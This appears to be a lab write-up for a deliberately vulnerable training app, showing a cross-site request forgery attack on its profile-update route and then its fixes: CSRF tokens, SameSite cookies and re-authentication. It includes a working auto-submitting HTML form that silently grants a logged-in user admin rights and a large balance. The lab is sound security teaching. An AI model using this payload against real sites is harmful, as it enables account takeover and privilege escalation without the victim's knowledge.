# Lab 06b: CSRF on the profile update

State-changing routes rely only on the session cookie — there is no CSRF token anywhere in the app. Any page on the internet can submit a form with your cookie attached.

**OWASP Top 10:2025:** [A01 Broken Access Control](https://owasp.org/Top10/2025/)

**Code:** every `POST` route; notably `routes/account.js` (`/account`) and `routes/orders.js` (`/checkout`). `server.js` even leaves a comment noting CSRF is intentionally absent.

## Exploit

1. Log in as **bob** in your browser.
2. Host this page anywhere (localhost is fine):

```html
<!-- csrf.html -->
<html><body>
<form method="POST" action="http://localhost:8888/account">
  <input name="email" value="hacked@evil.example">
  <input name="role" value="admin">
  <input name="balance" value="999999">
</form>
<script>document.forms[0].submit()</script>
</body></html>
```

3. Visit that page while still logged in as bob. You land on `http://localhost:8888/account?saved=1` and bob is now `admin` with balance 999999:

```sql
SELECT username, role, balance FROM users WHERE username='bob';
```

The attack is invisible to the victim — a redirect or an `<iframe>` hides it entirely.

## Why it happens

The browser sends the session cookie with every request to the site, no matter who initiated the request. A cookie authenticates, it does not *authorize the form*.

## Fix

- Add a per-session CSRF token to every state-changing form (a cryptographically random value, stored server-side, compared on POST).
- Add `SameSite=Lax` (or `Strict`) to the session cookie as a second layer: cross-site POSTs then arrive without the cookie.
- Re-authentication (password prompt) for sensitive changes such as `role` or bank details.

```js
// express-session: cookie: { sameSite: "lax", ... }
// + middleware comparing req.body._csrf with the session token
```

## Verify

After the fix, the cross-site form is rejected for missing/invalid token — even before SameSite blocks the cookie.

## Note

Combined with lab 04 this is full account takeover by drive-by: CSRF + mass assignment. Defense in depth matters because each fix alone would have stopped it.